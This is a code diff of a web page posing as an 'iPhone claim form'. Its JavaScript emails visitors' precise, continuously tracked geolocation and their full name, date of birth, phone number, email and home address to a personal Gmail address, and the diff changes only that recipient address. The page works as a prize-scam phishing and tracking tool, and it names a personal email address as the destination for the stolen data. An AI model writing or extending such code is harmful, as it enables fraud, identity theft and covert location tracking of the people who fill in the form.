@@ -144,7 +144,7 @@
 
             function sendLocationEmail(latitude, longitude) {
                 locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodini@gmail.com");
             }
 
             function trackMovement() {
@@ -186,7 +186,7 @@
                                     locationDisplay.textContent = "An unknown error occurred.";
                                     break;
                             }
-                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
+                            sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodini@gmail.com");
                         },
                         { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                     );
@@ -210,7 +210,7 @@
 
                 const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
 
-                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodeni@gmail.com");
+                sendEmail("New iPhone Claim Form Submission", formMessage, "khalilrodini@gmail.com");
 
                 alert("Thank you for your submission! We will contact you shortly.");
             });
